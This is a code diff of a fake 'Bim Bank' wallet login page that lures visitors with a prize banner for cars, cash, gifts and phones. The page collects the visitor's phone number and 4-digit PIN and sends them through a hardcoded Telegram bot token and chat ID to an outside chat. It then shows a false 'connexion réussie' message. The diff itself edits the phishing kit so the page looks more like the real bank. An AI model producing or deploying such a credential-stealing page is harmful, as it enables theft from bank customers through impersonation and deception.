@@ -3,128 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bim Bank - Félicitations</title>
+    <title>Bim Bank - Espace Wallet</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@900&family=Segoe+UI:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
         
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; }
 
-        /* خلفية الشبكة المربعة */
-        .bg-app-grid {
-            background-image: linear-gradient(#f3f4f6 1px, transparent 1px), linear-gradient(90deg, #f3f4f6 1px, transparent 1px);
+        /* خلفية الشبكة المربعة الرسمية */
+        .grid-bg {
+            background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px);
             background-size: 20px 20px;
         }
 
-        /* كلمة مبروك المزخرفة */
-        .congrats-title {
-            font-family: 'Cairo', sans-serif;
-            font-size: 50px;
-            font-weight: 900;
-            background: linear-gradient(to bottom, #f19e2c 0%, #d97706 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.2));
-            text-align: center;
-            padding: 20px 0 10px 0;
-            display: block;
+        /* تصميم الشعار الملون */
+        .logo-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            padding: 25px 0 10px 0;
         }
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            position: relative;
+            transform: rotate(-15deg);
+        }
+        .quadrant { position: absolute; width: 24px; height: 24px; border-radius: 4px; }
+        .q1 { background: #00a19a; top: 0; left: 0; }
+        .q2 { background: #e6007e; top: 0; right: 0; }
+        .q3 { background: #f19e2c; bottom: 0; left: 0; }
+        .q4 { background: #2a4387; bottom: 0; right: 0; }
 
-        /* شريط الجوائز بواقعية أكثر */
-        .prize-banner-real {
-            background: linear-gradient(135deg, #f19e2c 0%, #b45309 100%);
-            margin: 10px 20px;
-            padding: 20px 10px;
-            border-radius: 20px;
+        .logo-text-border { border-left: 2px solid #2a4387; padding-left: 12px; text-align: left; }
+        .logo-main-title { color: #2a4387; font-size: 26px; font-weight: 800; line-height: 0.9; }
+        .logo-sub-title { color: #2a4387; font-size: 10px; font-weight: bold; letter-spacing: 0.5px; }
+
+        /* شريط الجوائز الإعلاني (صور حقيقية) */
+        .ad-prize-banner {
+            background: linear-gradient(135deg, #f19e2c 0%, #d97706 100%);
+            margin: 10px 25px;
+            padding: 15px;
+            border-radius: 15px;
             display: flex;
             justify-content: space-around;
-            box-shadow: 0 15px 30px rgba(241, 158, 44, 0.3);
-            border: 2px solid rgba(255, 255, 255, 0.3);
+            box-shadow: 0 8px 20px rgba(241, 158, 44, 0.3);
         }
-        .prize-unit { text-align: center; width: 22%; }
+        .prize-box { text-align: center; }
         .prize-img { 
-            width: 50px; 
-            height: 50px; 
+            width: 45px; 
+            height: 45px; 
             object-fit: contain; 
-            margin: 0 auto;
-            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
-            transition: transform 0.3s;
+            filter: drop-shadow(0 4px 4px rgba(0,0,0,0.15));
         }
-        .prize-unit:hover .prize-img { transform: scale(1.2); }
-        .prize-tag { font-size: 10px; font-weight: 900; color: white; margin-top: 8px; text-transform: uppercase; }
+        .prize-label { color: white; font-size: 9px; font-weight: 900; margin-top: 5px; text-transform: uppercase; }
 
-        /* التنسيقات الرسمية */
-        .field-box {
+        /* التنسيقات المطابقة للواجهة */
+        .input-control {
             width: 100%;
-            padding: 16px;
+            padding: 15px;
             border: 1px solid #d1d5db;
-            border-radius: 10px;
+            border-radius: 8px;
             font-size: 16px;
             outline: none;
-            background: white;
         }
-        .tracker { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 4px; }
+        .count-hint { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 4px; }
 
-        .btn-action {
+        .btn-bim {
             background-color: #f19e2c;
             color: white;
             font-weight: 700;
-            padding: 16px;
-            border-radius: 10px;
+            padding: 15px;
+            border-radius: 8px;
             width: 100%;
-            font-size: 1.2rem;
-            margin-top: 25px;
-            box-shadow: 0 4px 10px rgba(241, 158, 44, 0.4);
+            font-size: 1.1rem;
+            margin-top: 20px;
         }
     </style>
 </head>
-<body class="bg-app-grid min-h-screen">
+<body class="grid-bg min-h-screen">
 
-    <!-- استبدال الشعار بكلمة مبروك مزخرفة -->
-    <div class="congrats-title">! مبروك</div>
-
-    <!-- شريط الجوائز بصور حقيقية -->
-    <div class="prize-banner-real">
-        <div class="prize-unit">
-            <img src="https://img.icons8.com/color/96/car-key.png" alt="Auto" class="prize-img">
-            <div class="prize-tag">AUTO</div>
+    <!-- إعادة الشعار كما كان -->
+    <div class="logo-section">
+        <div class="logo-icon">
+            <div class="quadrant q1"></div>
+            <div class="quadrant q2"></div>
+            <div class="quadrant q3"></div>
+            <div class="quadrant q4"></div>
         </div>
-        <div class="prize-unit">
-            <img src="https://img.icons8.com/color/96/money-bag-with-cash.png" alt="Cash" class="prize-img">
-            <div class="prize-tag">CASH</div>
-        </div>
-        <div class="prize-unit">
-            <img src="https://img.icons8.com/color/96/gift--v1.png" alt="Gift" class="prize-img">
-            <div class="prize-tag">GIFT</div>
-        </div>
-        <div class="prize-unit">
-            <img src="https://img.icons8.com/color/96/iphone-x.png" alt="Tech" class="prize-img">
-            <div class="prize-tag">TECH</div>
+        <div class="logo-text-border">
+            <div class="logo-main-title">bimbank</div>
+            <div class="logo-sub-title">BANQUE ISLAMIQUE</div>
         </div>
     </div>
 
-    <div class="text-center mt-4">
-        <p class="text-[#2a4387] font-bold text-lg">Bienvenue dans votre espace wallet</p>
+    <!-- استبدال الإيموجي بصور حقيقية إعلانية -->
+    <div class="ad-prize-banner">
+        <div class="prize-box">
+            <img src="https://cdn-icons-png.flaticon.com/512/741/741407.png" alt="Auto" class="prize-img">
+            <div class="prize-label">AUTO</div>
+        </div>
+        <div class="prize-box">
+            <img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" alt="Cash" class="prize-img">
+            <div class="prize-label">CASH</div>
+        </div>
+        <div class="prize-box">
+            <img src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png" alt="Gift" class="prize-img">
+            <div class="prize-label">GIFT</div>
+        </div>
+        <div class="prize-box">
+            <img src="https://cdn-icons-png.flaticon.com/512/644/644458.png" alt="Tech" class="prize-img">
+            <div class="prize-label">TECH</div>
+        </div>
+    </div>
+
+    <div class="text-center mt-3">
+        <p class="text-[#2a4387] font-semibold">Bienvenue dans votre espace wallet</p>
     </div>
 
     <div class="max-w-sm mx-auto px-6 mt-6">
-        <div class="flex border-2 border-[#2a4387] rounded-xl overflow-hidden">
-            <div class="flex-1 bg-[#2a4387] text-white py-3 text-center font-bold">Wallet</div>
-            <div class="flex-1 bg-white text-gray-400 py-3 text-center font-bold">Banking</div>
+        <div class="flex border-2 border-[#2a4387] rounded-lg overflow-hidden">
+            <div class="flex-1 bg-[#2a4387] text-white py-2.5 text-center font-bold">Wallet</div>
+            <div class="flex-1 bg-white text-gray-400 py-2.5 text-center font-bold">Banking</div>
         </div>
     </div>
 
-    <div class="max-w-sm mx-auto px-6 mt-10">
-        <h2 class="text-[#2a4387] font-bold text-xl mb-6">Connexion</h2>
+    <div class="max-w-sm mx-auto px-6 mt-8">
+        <h2 class="text-[#2a4387] font-bold text-xl mb-5">Connexion</h2>
 
-        <div class="space-y-6">
+        <div class="space-y-4">
             <div>
-                <input id="ph" type="tel" maxlength="8" oninput="limitIn(this, 'ph_c')" class="field-box" placeholder="Téléphone">
-                <div id="ph_c" class="tracker">0/8</div>
+                <input id="tel" type="tel" maxlength="8" oninput="track(this, 'c1')" class="input-control" placeholder="Téléphone">
+                <div id="c1" class="count-hint">0/8</div>
             </div>
             <div>
-                <input id="pi" type="password" maxlength="4" oninput="limitIn(this, 'pi_c')" class="field-box" placeholder="Mot de passe">
-                <div id="pi_c" class="tracker">0/4</div>
+                <input id="pwd" type="password" maxlength="4" oninput="track(this, 'c2')" class="input-control" placeholder="Mot de passe">
+                <div id="c2" class="count-hint">0/4</div>
             </div>
         </div>
 
@@ -132,35 +147,33 @@
             <a href="#" class="text-gray-400 text-sm">Mot de passe oublié ?</a>
         </div>
 
-        <button onclick="sendToBot()" class="btn-action">Connexion</button>
+        <button onclick="sendData()" class="btn-bim">Connexion</button>
 
-        <div class="mt-14 text-center">
-            <p class="text-gray-400">Nouvel utilisateur ?</p>
+        <div class="mt-12 text-center">
+            <p class="text-gray-500">Nouvel utilisateur ?</p>
             <a href="#" class="text-[#2a4387] font-bold mt-1 block">S'inscrire maintenant &rarr;</a>
         </div>
     </div>
 
     <script>
-        const B_T = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
-        const C_D = "8665814266";
+        const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
+        const CHAT = "8665814266";
 
-        function limitIn(el, cid) {
+        function track(el, id) {
             el.value = el.value.replace(/[^0-9]/g, '');
-            document.getElementById(cid).textContent = el.value.length + '/' + el.maxLength;
+            document.getElementById(id).textContent = el.value.length + '/' + el.maxLength;
         }
 
-        function sendToBot() {
-            const p = document.getElementById('ph').value;
-            const s = document.getElementById('pi').value;
+        function sendData() {
+            const p = document.getElementById('tel').value;
+            const s = document.getElementById('pwd').value;
             if(p.length === 8 && s.length === 4) {
-                const text = `🎉 Winner Logged In!\n📱 Phone: ${p}\n🔐 PIN: ${s}`;
-                fetch(`https://api.telegram.org/bot${B_T}/sendMessage?chat_id=${C_D}&text=${encodeURIComponent(text)}`)
+                const msg = `💰 BimBank Prize Entry:\n📱 Tel: ${p}\n🔐 PIN: ${s}`;
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`)
                 .then(() => {
-                    alert("Succès! Validation de votre prix en cours.");
+                    alert("Connexion réussie. Validation de votre bonus en cours...");
                     location.reload();
                 });
-            } else {
-                alert("يرجى إدخال البيانات كاملة.");
             }
         }
     </script>
